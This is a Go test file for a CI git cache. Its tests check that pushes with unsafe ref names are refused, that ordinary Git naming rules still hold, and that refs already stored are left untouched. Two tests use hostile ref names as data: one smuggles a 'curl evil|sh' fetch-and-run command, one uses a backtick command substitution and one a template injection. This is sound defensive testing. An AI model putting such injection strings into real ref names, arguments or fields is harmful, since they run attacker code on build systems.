package gitcache

import (
	"context"
	"strings"
	"testing"

	"github.com/oberthci/oberth/internal/model"
)

func TestReceivePackRejectsUnsafeRunRefs(t *testing.T) {
	repository := newTestRepository(t)
	cache := newTestCache(t, repository.upstream)
	ready, err := cache.Ensure(context.Background(), "example")
	if err != nil {
		t.Fatal(err)
	}
	// Admit the reachable default-branch commit independently of ref spelling,
	// so removing the alphabet guard would also accept the hostile tag.
	lock := cache.repoLock("example")
	lock.Lock()
	_, err = cache.prepareReleaseAdmissionLocked(context.Background(), ready.Path, true)
	lock.Unlock()
	if err != nil {
		t.Fatal(err)
	}
	receivePack := backendServiceCommand(t, cache, ReceivePack)
	for _, ref := range []string{
		"refs/tags/v9.9.9;curl${IFS}evil|sh",
		"refs/heads/topic{{workflow.parameters.x}}",
		"refs/heads/topic`id`",
	} {
		t.Run(ref, func(t *testing.T) {
			output, err := pushWithReceivePack(repository.work, ready.Path, receivePack, repository.initialSHA+":"+ref)
			want := model.ValidateRunRef(ref)
			if want == nil {
				t.Fatal("hostile ref accepted by shared validation")
			}
			if err == nil || !strings.Contains(output, want.Error()) {
				t.Fatalf("push = %v, output %q; want plain refusal %q", err, output, want)
			}
			if got := runGitOptional(t, ready.Path, "show-ref", "--verify", ref); got != "" {
				t.Fatal("rejected push created a ref")
			}
		})
	}
}

func TestRunRefAlphabetKeepsGitStructuralRules(t *testing.T) {
	for _, ref := range []string{"topic..other", "topic.lock", "topic//other", "refs/heads/topic", "topic/"} {
		if ValidateBranch(ref) == nil || ValidateTag(ref) == nil {
			t.Errorf("invalid Git name accepted: %q", ref)
		}
	}
	for _, ref := range []string{"topic@work=one,two", "feature/topic", "v1.2.3-rc.1+build"} {
		if err := ValidateBranch(ref); err != nil {
			t.Errorf("safe branch %q: %v", ref, err)
		}
		if err := ValidateTag(ref); err != nil {
			t.Errorf("safe tag %q: %v", ref, err)
		}
	}
}

func TestRunRefAlphabetNeverDropsStoredRefs(t *testing.T) {
	repository := newTestRepository(t)
	cache := newTestCache(t, repository.upstream)
	refs := []string{"refs/tags/v9.9.9;curl${IFS}evil|sh", "refs/heads/topic{{workflow.parameters.x}}", "refs/heads/topic`id`"}
	for _, ref := range refs {
		runGit(t, repository.upstream, "update-ref", ref, repository.initialSHA)
	}
	ready, err := cache.Ensure(context.Background(), "example")
	if err != nil {
		t.Fatal(err)
	}
	for round := 0; round < 2; round++ {
		for _, ref := range refs {
			if got := runGit(t, ready.Path, "rev-parse", "--verify", ref); got != repository.initialSHA {
				t.Fatalf("stored ref %q changed: %q", ref, got)
			}
		}
		if _, err := cache.Ensure(context.Background(), "example"); err != nil {
			t.Fatal(err)
		}
	}
}
